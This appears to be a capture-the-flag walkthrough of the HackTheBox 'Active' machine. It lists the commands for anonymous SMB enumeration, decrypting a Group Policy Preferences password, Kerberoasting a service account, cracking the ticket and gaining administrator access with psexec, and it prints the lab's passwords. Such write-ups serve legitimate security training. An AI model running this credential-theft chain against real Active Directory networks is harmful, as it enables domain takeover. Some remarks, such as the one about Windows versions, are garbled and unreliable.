MACHINE NAME: Active
MACHINE IP: 10.10.10.100

There are a number of open ports on this machine, including some interesting ones, 445,88 and 139.

DNS is open, so let's do a dnsrecon to see if there's anything interesting.

dnsrecond -d 10.10.10.100 -r 10.0.0.0/8

Wee'll also havea look at port 445, for any SMB related info. Let's use the safe smb enum script to enumerate this port.

nmap --script safe -p 445 10.10.10.100 

Nothing much from the enum script, it fails to execute.

Next, let's list the shares; smbclient -L //10.10.10.100

This supports anon login, no need for the password. We can see the shares listed. 

We can also use smbmap: smbmap -H 10.10.10.100

The Replication dir seems to be accessible, read only though. We shall thus try to mount and see what it's here using smbmap.

smbmap -R Replication -H 10.10.10.100

Alt.

smbclient //10.10.10.100/Replication
prompt OFF
recurse ON

we can download all the files; mget .

Groups.xml seem interesting, this is where all the group policies where local account policies are stored. Can't be used to push updates to endpoints in a windows environment, before windows 12.

smbmap -R Replication -H 10.10.10.100 -A Groups.xml -q

This will download the file to our local syetem. There's an encrypted password.

gpp-decrypt <hash>

passwd<svc_tgs>: GPPstillStandingStrong2k18

impacket to the rescue	

GetADUsers.py -all active.htb/svc_tgs -dc-ip 10.10.10.100

We have 4 users on this box.

It looks like the C:\users\ directory, just as I had hoped.

smbclient //10.10.10.100/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18                                                                                                         
Kerberoasting

Kerberos is a protocol for authentication used in Windows Active Directory environments (though it can be used for auth to Linux hosts as well).

There's an interesting read here https://files.sans.org/summit/hackfest2014/PDFs/Kicking%20the%20Guard%20Dog%20of%20Hades%20-%20Attacking%20Microsoft%20Kerberos%20%20-%20Tim%20Medin(1).pdf


GetUserSPNs.py -request active.htb/SVC_TGS

this gets us the Admin kerberos ticket.

We'll save this file and use john to crack it.

And voila! we got the administrator password : Ticketmaster1968

Let's run psexec.

psexec.py administrator@active.htb



